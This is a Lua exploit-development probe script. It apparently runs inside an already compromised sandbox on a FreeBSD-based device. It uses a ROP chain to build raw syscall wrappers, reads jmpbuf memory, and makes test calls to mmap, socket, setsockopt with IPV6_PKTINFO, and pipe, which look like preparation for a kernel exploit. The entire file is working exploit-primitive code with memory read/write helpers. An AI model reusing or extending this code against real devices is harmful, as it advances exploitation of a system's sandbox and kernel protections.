-- CRASH_CLASS: LOW
-- PROBE 84d: Confirm ROP chain works via make_syscall, then understand
-- why native.fcall crashes. The __call path uses the same chain.
-- Key: make_syscall WORKS, native.fcall CRASHES - what's different?

print("=== PROBE 84d: CHAIN WORKS ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end

-- Test 1: getpid via make_syscall
print("--- GETPID ---")
local ok1, ret1 = pcall(function() return make_syscall(20)() end)
print("getpid ok=" .. tostring(ok1) .. " ret=" .. tostring(ret1))
if ok1 then print("pid=" .. to_num(ret1)) end

-- Test 2: Check jmpbuf AFTER a successful call
print("")
print("--- JMPBUF AFTER CALL ---")
if fcall and fcall.chain and fcall.chain.jmpbuf then
    local jb = fcall.chain.jmpbuf
    for off = 0, 0x58, 8 do
        local ok, val = pcall(function()
            return memory.read_qword(uint64(string.format("0x%X", jb + off)))
        end)
        if ok and val then
            local h, l = 0, 0
            if type(val) == "table" and val.h then h = val.h; l = val.l
            else l = to_num(val) end
            if h ~= 0 or l ~= 0 then
                print(string.format("jb+0x%02X=%s", off, tostring(val)))
            end
        end
    end
end

-- Test 3: Read the pipe's own chain vs fcall chain
-- Are they the same chain or different?
print("")
print("--- CHAIN COMPARISON ---")
local pipe_str = tostring(syscall.pipe)
local rop_match = pipe_str:match("ropchain @ (0x[0-9a-fA-F]+)")
print("pipe_ropchain=" .. tostring(rop_match))
print("fcall_chain_stack_base=" .. tostring(fcall.chain.stack_base))
-- These should be different if they're separate chains

-- Test 4: Try mmap via make_syscall (477)
print("")
print("--- MMAP ---")
local ok4, ret4 = pcall(function()
    return make_syscall(477)(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
print("mmap ok=" .. tostring(ok4) .. " ret=" .. tostring(ret4))

-- Test 5: Try socket(AF_INET6=28, SOCK_DGRAM=2, IPPROTO_UDP=17)
print("")
print("--- SOCKET ---")
local ok5, ret5 = pcall(function()
    return make_syscall(97)(uint64(28), uint64(2), uint64(17))
end)
print("socket ok=" .. tostring(ok5) .. " ret=" .. tostring(ret5))
if ok5 then
    local fd = to_num(ret5)
    print("fd=" .. fd)
    -- Close it
    if fd > 0 then
        pcall(function() make_syscall(6)(uint64(fd)) end)
    end
end

-- Test 6: Try calling setsockopt via make_syscall
-- setsockopt = 105
-- We need this for IPV6_PKTINFO setup
print("")
print("--- SETSOCKOPT TEST ---")
-- Create a socket first
local ok6, sock = pcall(function()
    return make_syscall(97)(uint64(28), uint64(2), uint64(17))
end)
if ok6 then
    local fd = to_num(sock)
    print("sock_fd=" .. fd)
    if fd > 0 then
        -- Try setsockopt(fd, IPPROTO_IPV6=41, IPV6_PKTINFO=46, &val, sizeof(int))
        local optbuf = memory.alloc(4)
        memory.write_dword(optbuf, 1)
        local ok7, ret7 = pcall(function()
            return make_syscall(105)(uint64(fd), uint64(41), uint64(46),
                uint64(optbuf), uint64(4))
        end)
        print("setsockopt ok=" .. tostring(ok7) .. " ret=" .. tostring(ret7))
        pcall(function() make_syscall(6)(uint64(fd)) end)
    end
end

-- Test 7: pipe(2) via make_syscall(42)
print("")
print("--- PIPE ---")
local pipebuf = memory.alloc(8)
memory.write_dword(pipebuf, 0)
memory.write_dword(pipebuf + 4, 0)
local ok8, ret8 = pcall(function()
    return make_syscall(42)(uint64(pipebuf))
end)
print("pipe ok=" .. tostring(ok8) .. " ret=" .. tostring(ret8))
if ok8 then
    local rd_fd = memory.read_dword(pipebuf)
    local wr_fd = memory.read_dword(pipebuf + 4)
    print("pipe_fds=" .. to_num(rd_fd) .. "," .. to_num(wr_fd))
end

print("=== PROBE 84d COMPLETE ===")
